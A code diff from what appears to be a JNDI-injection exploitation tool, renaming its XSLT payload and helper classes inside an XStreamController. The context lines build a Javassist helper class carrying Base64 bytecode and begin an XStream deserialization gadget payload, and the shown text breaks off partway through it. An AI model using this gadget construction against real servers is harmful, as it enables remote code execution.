@@ -7,8 +7,8 @@ import javassist.bytecode.ClassFile;
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
 import map.jndi.controller.BasicController;
-import map.jndi.payload.XsltPayload;
-import map.jndi.template.XsltHelper;
+import map.jndi.payload.XSLTPayload;
+import map.jndi.template.XSLTHelper;
 import map.jndi.util.MiscUtil;
 import map.jndi.util.ReflectUtil;
 import org.apache.naming.ResourceRef;
@@ -34,7 +34,7 @@ public class XStreamController extends BasicController {
 
         String helperClassName = MiscUtil.getClassName();
         ClassPool pool = ClassPool.getDefault();
-        CtClass helperClazz = pool.get(XsltHelper.class.getName());
+        CtClass helperClazz = pool.get(XSLTHelper.class.getName());
         helperClazz.replaceClassName(helperClazz.getName(), helperClassName);
 
         ReflectUtil.setCtField(helperClazz, "xsltPath", CtField.Initializer.constant(xsltPath));
@@ -42,7 +42,7 @@ public class XStreamController extends BasicController {
         ReflectUtil.setCtField(helperClazz, "className", CtField.Initializer.constant(className));
         ReflectUtil.setCtField(helperClazz, "payload", CtField.Initializer.constant(Base64.getEncoder().encodeToString(byteCode)));
 
-        String xsltContent = XsltPayload.loadClass(helperClassName, helperClazz.toBytecode());
+        String xsltContent = XSLTPayload.loadClass(helperClassName, helperClazz.toBytecode());
         String payload = "<sorted-set>" +
                 "  <javax.naming.ldap.Rdn_-RdnEntry>" +
                 "    <type>test</type>" +
